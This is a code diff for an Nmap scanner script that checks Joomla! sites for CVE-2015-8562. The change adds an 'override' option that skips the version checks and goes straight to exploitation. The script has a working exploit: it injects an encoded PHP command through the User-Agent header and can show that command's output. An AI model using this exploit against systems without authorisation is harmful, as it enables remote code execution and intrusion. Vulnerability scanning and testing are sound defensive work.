@@ -17,22 +17,24 @@ are not vulnerable as they check for invalid session data.
 --
 -- @output
 -- PORT   STATE SERVICE
--- 80/tcp open  http
+-- 80/tcp open  http    syn-ack
 -- | http-vuln-cve2015-8562:
 -- |   VULNERABLE:
 -- |   Joomla! remote code execution due to unsanitized HTTP headers
--- |     State: VULNERABLE (Exploitable)
--- |     IDs:  CVE:CVE-2015-8562  BID:79195
+-- |     State: VULNERABLE
+-- |     IDs:  BID:79195  CVE:CVE-2015-8562
 -- |     Risk factor: High  CVSS2: 7.5
 -- |       Joomla! suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5 due to
 -- |       storage of unsanitized headers in session data.
 -- |     Disclosure date: 2015-12-15
+-- |     Exploit results:
+-- |       Joomla! version 3.4.3. PHP Version 5.4.7.
 -- |     References:
 -- |       https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html
--- |       https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html
 -- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562
+-- |       http://www.securityfocus.com/bid/79195
 -- |       https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html
--- |_      http://www.securityfocus.com/bid/79195
+-- |_      https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html
 --
 --
 -- @args http-vuln-cve2015-8562.path The path to start in; eg, <code>"/web/"</code> will try <code>"/web/xxx"</code>.
@@ -40,6 +42,7 @@ are not vulnerable as they check for invalid session data.
 -- @args http-vuln-cve2015-8562.command The custom command to use instead of the default 'phpinfo()'
 -- @args http-vuln-cve2015-8562.showoutput Shows the output of the exploit on the screen. The output maybe ugly depending on the command
 -- executed. False by default.
+-- @args http-vuln-cve2015-8562.override Proceed with checking via exploitation, bypassing the version checks.
 --
 -- @xmloutput
 -- <elem key="title">Joomla! remote code execution due to unsanitized
@@ -65,6 +68,9 @@ are not vulnerable as they check for invalid session data.
 --   </table>
 -- </table>
 -- <elem key="disclosure">2015-12-15</elem>
+-- <table key="exploit_results">
+--   <elem>Joomla! version 3.4.3. PHP Version 5.4.7.</elem>
+-- </table>
 -- <table key="refs">
 --   <elem>
 --   https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html</elem>
@@ -91,11 +97,11 @@ categories = {
 portrule = shortport.http
 
 local function encode_payload(command)
-	local encoded_command = strbuf.new()
-	for i=1, #command do
-		encoded_command = encoded_command .. "chr(" .. string.byte(command:sub(i,i)) .. ")."
-	end
-	return strbuf.dump(encoded_command):sub(1,-2)
+  local encoded_command = strbuf.new()
+  for i=1, #command do
+    encoded_command = encoded_command .. "chr(" .. string.byte(command:sub(i,i)) .. ")."
+  end
+  return strbuf.dump(encoded_command):sub(1,-2)
 end
 
 local function get_payload(command)
@@ -115,90 +121,96 @@ function action (host, port)
   local exploit = stdnse.get_script_args(SCRIPT_NAME .. ".exploit") or false
   local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or "phpinfo();"
   local showoutput = stdnse.get_script_args(SCRIPT_NAME .. ".showoutput") or false
-
-  local response = http.get(host, port, path)
-  if response and response.status ~= 200 then
-    return nil
-  end
-
-  local is_php_vulnerable=false
-
-  if not response.header['x-powered-by'] then
-  	stdnse.debug1('Is this even running PHP?')
-    return nil
-  else
-    local php_version =  string.match(response.header['x-powered-by'],'PHP%/([%d%.]+)')
-    local ubuntu_version = string.match(response.header['x-powered-by'],'ubuntu([%d%.]+)') or false
-    local is_deb = string.match(response.header['x-powered-by'],'deb') or false
-    stdnse.debug1('PHP Version %s',response.header['x-powered-by'])
-    if is_deb then
-      if php_version > '5.4.45' then
-        is_php_vulnerable=false
-      --confirm the below check once
-      elseif php_version > '5.4.45' and response.header['x-powered-by']:match('7[u%.]1') then
-        is_php_vulnerable=false
-      else
-        is_php_vulnerable=true
-      end
-    elseif ubuntu_version then
-      if php_version > '5.5.9' then
-        is_php_vulnerable=false
-      elseif php_version=='5.5.9' and ubuntu_version >= '4.13' then
-        is_php_vulnerable=false
-      elseif php_version=='5.3.10' and ubuntu_version >= '3.20' then
-        is_php_vulnerable=false
-      else
-        is_php_vulnerable=true
-      end
-    elseif php_version < '5.5.0' then
-      is_php_vulnerable=true
-    elseif php_version>= '5.5.0' and php_version<='5.5.28' then
-      is_php_vulnerable=true
-    elseif php_version>= '5.6.0' and php_version<='5.6.12' then
-      is_php_vulnerable=true
-    end
-  end
-
-
-  if not is_php_vulnerable then
-    stdnse.debug1('This version of PHP looks safe!')
-    return nil
-  end
-
-  local paths = {'/', '/administartor/'}
-  local joomla_and_online = false
-
-  local normalized_path = nil
-  for _, subpath in pairs(paths) do
-    normalized_path = string.gsub(path .. subpath, "//", "/")
-    response = http.get(host, port, normalized_path)
-    if response and response.status==200 then
-      if string.match(response.body, '<meta name="generator" content="Joomla!') then
-        joomla_and_online = true
-        break
-      end
-    end
-  end
-
-  if not joomla_and_online then
-    stdnse.debug1("Joomla! was not found on target!")
-    return nil
-  end
-
-  normalized_path = string.gsub(path .. 'administrator/manifests/files/joomla.xml', '//', '/')
-  response = http.get(host, port, normalized_path)
+  local override = stdnse.get_script_args(SCRIPT_NAME .. ".override") or false
   local joomla_version = nil
-  if response and response.status == 200 then
-    local parser = slaxml.parser:new()
-    parser._call = {startElement = function(name)
-        if name =='version' then parser._call.text = function(content) joomla_version = content end end end,
-        closeElement = function(name) parser._call.text = function() return nil end end
-    }
-    parser:parseSAX(response.body, {stripWhitespace=true})
+  local php_version = nil
+  -- override isn't set, let's check for the php versions.
+  if not override then
+
+    local response = http.get(host, port, path)
+    if response and response.status ~= 200 then
+      return nil
+    end
+
+    local is_php_vulnerable=false
+
+    if not response.header['x-powered-by'] then
+      stdnse.debug1('PHP info not in headers. Run the script with override set to true to confirm.')
+      return nil
+    else
+      php_version =  string.match(response.header['x-powered-by'],'PHP%/([%d%.]+)')
+      local ubuntu_version = string.match(response.header['x-powered-by'],'ubuntu([%d%.]+)') or false
+      local is_deb = string.match(response.header['x-powered-by'],'deb') or false
+      stdnse.debug1('PHP Version %s',response.header['x-powered-by'])
+      if is_deb then
+        if php_version > '5.4.45' then
+          is_php_vulnerable=false
+        --confirm the below check once
+        elseif php_version > '5.4.45' and response.header['x-powered-by']:match('7[u%.]1') then
+          is_php_vulnerable=false
+        else
+          is_php_vulnerable=true
+        end
+      elseif ubuntu_version then
+        if php_version > '5.5.9' then
+          is_php_vulnerable=false
+        elseif php_version=='5.5.9' and ubuntu_version >= '4.13' then
+          is_php_vulnerable=false
+        elseif php_version=='5.3.10' and ubuntu_version >= '3.20' then
+          is_php_vulnerable=false
+        else
+          is_php_vulnerable=true
+        end
+      elseif php_version < '5.5.0' then
+        is_php_vulnerable=true
+      elseif php_version>= '5.5.0' and php_version<='5.5.28' then
+        is_php_vulnerable=true
+      elseif php_version>= '5.6.0' and php_version<='5.6.12' then
+        is_php_vulnerable=true
+      end
+    end
+
+
+    if not is_php_vulnerable then
+      stdnse.debug1('This version of PHP looks safe!')
+      return nil
+    end
+
+    local paths = {'/', '/administartor/'}
+    local joomla_and_online = false
+
+    local normalized_path = nil
+    for _, subpath in pairs(paths) do
+      normalized_path = string.gsub(path .. subpath, "//", "/")
+      response = http.get(host, port, normalized_path)
+      if response and response.status==200 then
+        if string.match(response.body, '<meta name="generator" content="Joomla!') then
+          joomla_and_online = true
+          break
+        end
+      end
+    end
+
+    if not joomla_and_online then
+      stdnse.debug1("Joomla! was not found on target!")
+      return nil
+    end
+
+    normalized_path = string.gsub(path .. 'administrator/manifests/files/joomla.xml', '//', '/')
+    response = http.get(host, port, normalized_path)
+    if response and response.status == 200 then
+      local parser = slaxml.parser:new()
+      parser._call = {startElement = function(name)
+          if name =='version' then parser._call.text = function(content) joomla_version = content end end end,
+          closeElement = function(name) parser._call.text = function() return nil end end
+      }
+      parser:parseSAX(response.body, {stripWhitespace=true})
+    end
   end
 
-  if joomla_version < '3.4.6' then
-  	stdnse.debug('Joomla! Version %s', joomla_version)
+  -- either we have a vulnerable version of joomla or override set to true.
+  if override or joomla_version < '3.4.6' then
+    stdnse.debug('Joomla! Version %s', joomla_version)
     local vuln_table = {
       title = "Joomla! remote code execution due to unsanitized HTTP headers",
       state = vulns.STATE.VULN,
@@ -215,52 +227,59 @@ function action (host, port)
       scores = {
         CVSS2 =  '7.5'
       },
-	  dates = {
-		   disclosure = { year = 2015, month = 12, day = 15},
-	  },
+    dates = {
+       disclosure = { year = 2015, month = 12, day = 15},
+    },
       description = [[Joomla! suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5 due to
-storage of unsanitized headers in session data.]]
+storage of unsanitized headers in session data.]],
+      exploit_results = string.format('Joomla! version %s. PHP Version %s.', joomla_version, php_version)
     }
 
-    if exploit then
+    -- one of exploit or override has to be true.
+    if exploit or override then
 
-	  local options
+      local options
 
-	  options = {header={}, no_cache=true, bypass_cache=true, redirect_ok=function(host,port)
-	      local c = 3
-	      return function(url)
-	        if ( c==0 ) then return false end
-	        c = c - 1
-	        return true
-	      end
-	  end }
-	  local left_pad = stdnse.generate_random_string(10,'abcdefghijklmnopqrstuvwxyz123456890')
-	  local right_pad = stdnse.generate_random_string(10, 'abcdefghijklmnopqrstuvwxyz123456890')
-	  command = 'echo("' .. left_pad .. '");' .. command .. 'echo("' .. right_pad ..'");'
-      options['header']['User-Agent'] = get_payload(command)
-      response = http.get(host, port, path, options)
-      options['cookies'] = response.cookies
-      response = http.get(host, port, path, options)
-      if response.body:match(left_pad) and response.body:match(right_pad) then
-  		vuln_table.state = vulns.STATE.EXPLOIT
-      	if not showoutput then
-	      	local report = vulns.Report:new(SCRIPT_NAME, host, port)
-      		return report:make_output(vuln_table)
-      	else
-      		vuln_table.exploit_results = response.body:match(left_pad .. '(.+)' .. right_pad)
-      		local report = vulns.Report:new(SCRIPT_NAME, host, port)
-      		return report:make_output(vuln_table)
-      	end
-      else
-      	vuln_table.state = vulns.STATE.LIKELY_VULN
-      	report:make_output(vuln_table)
-      end
+      options = {header={}, no_cache=true, bypass_cache=true, redirect_ok=function(host,port)
+          local c = 3
+          return function(url)
+            if ( c==0 ) then return false end
+            c = c - 1
+            return true
+          end
+      end }
+      local left_pad = stdnse.generate_random_string(10,'abcdefghijklmnopqrstuvwxyz123456890')
+      local right_pad = stdnse.generate_random_string(10, 'abcdefghijklmnopqrstuvwxyz123456890')
+      command = 'echo("' .. left_pad .. '");' .. command .. 'echo("' .. right_pad ..'");'
+        options['header']['User-Agent'] = get_payload(command)
+        response = http.get(host, port, path, options)
+        options['cookies'] = response.cookies
+        response = http.get(host, port, path, options)
+        -- a match was found
+        if response.body:match(left_pad) and response.body:match(right_pad) then
+        vuln_table.state = vulns.STATE.EXPLOIT
+          -- the output of the command isn't required
+          if not showoutput then
+            local report = vulns.Report:new(SCRIPT_NAME, host, port)
+            return report:make_output(vuln_table)
+          else
+            vuln_table.exploit_results = response.body:match(left_pad .. '(.+)' .. right_pad)
+            local report = vulns.Report:new(SCRIPT_NAME, host, port)
+            return report:make_output(vuln_table)
+          end
+        -- no match was found, maybe a patched old version.
+        else
+          vuln_table.state = vulns.STATE.NOT_VULN
+          report:make_output(vuln_table)
+        end
+    -- exploit isn't set to true
     else
       local report = vulns.Report:new(SCRIPT_NAME, host, port)
       return report:make_output(vuln_table)
     end
+  -- Not a vulnerable Joomla!
   else
-  	stdnse.debug1("Joomla! Looks Safe!")
-  	return nil
+    stdnse.debug1("Joomla! Looks Safe! Run with override set to true to be really sure.")
+    return nil
   end
 end
